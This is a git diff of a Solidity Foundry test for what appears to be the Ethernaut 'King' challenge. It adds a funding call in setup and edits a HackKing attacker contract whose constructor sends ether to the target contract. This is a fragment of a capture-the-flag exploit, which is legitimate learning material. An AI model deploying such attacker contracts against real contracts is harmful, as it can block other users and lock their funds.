@@ -11,6 +11,7 @@ contract KingTest is Test{
 
     function setUp() public {
         instanceking = new King{value: 1 ether}();
+        vm.deal(address(this), 1 ether);
     }
 
     function testKing() public {
@@ -36,9 +37,9 @@ contract KingTest is Test{
 
 }
 
-contract HackKing{
-    constructor(address _instanceAddress) payable{
-        (bool success, ) = payable(address(_instanceAddress)).call{value: msg.value}("");
+contract HackKing{ 
+    constructor(address payable _kingAddresss) payable{
+        (bool success, ) = payable(address(_kingAddresss)).call{value: msg.value}("");
         require(success, "Call failed");
     }
 
